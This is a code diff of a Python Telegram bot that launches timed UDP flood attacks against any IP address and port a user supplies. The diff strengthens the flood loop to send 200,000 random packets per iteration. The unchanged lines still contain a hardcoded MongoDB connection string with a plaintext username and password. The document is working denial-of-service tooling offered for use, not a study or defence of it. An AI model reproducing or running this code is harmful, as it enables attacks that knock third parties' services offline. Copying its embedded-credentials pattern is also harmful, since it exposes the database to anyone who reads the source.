@@ -14,7 +14,7 @@ ADMIN_ID = "7163028849"
 bot = telebot.TeleBot(BOT_TOKEN)
 
 # MongoDB setup
-MONGO_URI = "mongodb+srv://titanop24:titanop24@cluster0.qbdl8.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0" 
+MONGO_URI = "mongodb+srv://titanop24:titanop24@cluster0.qbdl8.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0"  
 client = MongoClient(MONGO_URI)
 db = client["telegram_bot"]
 users_collection = db["users"]
@@ -24,29 +24,21 @@ logs_collection = db["logs"]
 # Track active attack
 global_active_attack = Event()
 
+# 🛠️ Function to send UDP packets
 def udp_flood(target_ip, target_port, stop_flag):
-    try:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        
-        while not stop_flag.is_set():
-            packet_size = random.randint(64, 1469)  # Randomized packet size
-            data = os.urandom(packet_size)  # Randomized payload
-            source_port = random.randint(1024, 65535)  # Randomized source port
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # Allow socket address reuse
+    while not stop_flag.is_set():
+        try:
+            packet_size = random.randint(64, 1469)  # Random packet size
+            data = os.urandom(packet_size)  # Generate random data
+            for _ in range(200000):  # Maximize impact by sending multiple packets
+                sock.sendto(data, (target_ip, target_port))
+        except Exception as e:
+            logging.error(f"Error sending packets: {e}")
+            break  # Exit loop on any socket error
 
-            # Dynamic traffic patterns
-            for _ in range(random.randint(1000, 5000)):
-                try:
-                    # Send data with randomized source port
-                    sock.sendto(data, (target_ip, target_port))
-                except Exception as inner_e:
-                    logging.error(f"Error during UDP flood: {inner_e}")
-            # Pause briefly to mimic legitimate traffic
-            if random.random() > 0.7:
-                time.sleep(random.uniform(0.01, 0.1))
-    except Exception as e:
-        logging.error(f"Error in UDP flood function: {e}")
-
+# 🚀 Function to start a UDP flood attack
 def start_udp_flood(user_id, target_ip, target_port, attack_time):
     if global_active_attack.is_set():
         bot.send_message(user_id, "❌ Another attack is already running. Please wait until it finishes.")
@@ -73,6 +65,7 @@ def start_udp_flood(user_id, target_ip, target_port, attack_time):
 
     bot.send_message(user_id, f"☢️ Attack started on {target_ip}:{target_port} for {attack_time} seconds.")
 
+    # Wait for the attack duration and stop all processes
     stop_flag.wait(attack_time)
     stop_flag.set()
 
